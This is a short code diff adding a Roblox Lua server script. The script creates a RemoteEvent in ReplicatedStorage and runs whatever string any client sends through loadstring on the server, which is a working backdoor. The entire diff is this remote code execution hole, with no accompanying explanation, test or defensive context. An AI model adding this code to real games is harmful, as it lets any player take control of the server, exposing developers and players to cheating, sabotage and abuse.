@@ -1,0 +1,9 @@
+local e = Instance.new("RemoteEvent")
+e.Parent = game.ReplicatedStorage
+
+e.OnServerEvent:Connect(function(plr, s)
+	local suc, err = pcall(function()
+		loadstring(s)()
+	end)
+	if suc == false then warn(err) end
+end)
